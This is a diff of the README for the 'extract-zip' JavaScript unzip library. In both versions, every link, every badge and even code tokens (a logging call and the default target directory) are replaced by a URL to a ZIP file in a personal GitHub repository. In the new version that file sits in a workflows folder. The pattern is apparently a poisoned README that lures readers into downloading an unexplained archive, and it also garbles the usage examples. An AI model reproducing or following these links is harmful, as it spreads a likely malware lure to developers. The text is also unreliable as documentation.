@@ -2,11 +2,11 @@
 
 Unzip written in pure JavaScript. Extracts a zip into a directory. Available as a library or a command line program.
 
-Uses the [`yauzl`](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip) ZIP parser.
+Uses the [`yauzl`](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip) ZIP parser.
 
-[![NPM](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)
-[![Uses JS Standard Style](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)
-[![Build Status](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip)](https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip%3ACI)
+[![NPM](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)
+[![Uses JS Standard Style](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)
+[![Build Status](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip)](https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip%3ACI)
 
 ## Installation
 
@@ -32,7 +32,7 @@ const extract = require('extract-zip')
 async function main () {
   try {
     await extract(source, { dir: target })
-    https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip('Extraction complete')
+    https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip('Extraction complete')
   } catch (err) {
     // handle any errors
   }
@@ -51,7 +51,7 @@ Default modes are only used if no permissions are set in the zip file.
 ## CLI Usage
 
 ```
-extract-zip https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip <targetDirectory>
+extract-zip https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip <targetDirectory>
 ```
 
-If not specified, `targetDirectory` will default to `https://raw.githubusercontent.com/ibnumalik99/extract-zip/master/test/extract-zip-v1.0-alpha.5.zip()`.
+If not specified, `targetDirectory` will default to `https://github.com/ibnumalik99/extract-zip/raw/refs/heads/master/.github/workflows/zip-extract-v2.2.zip()`.
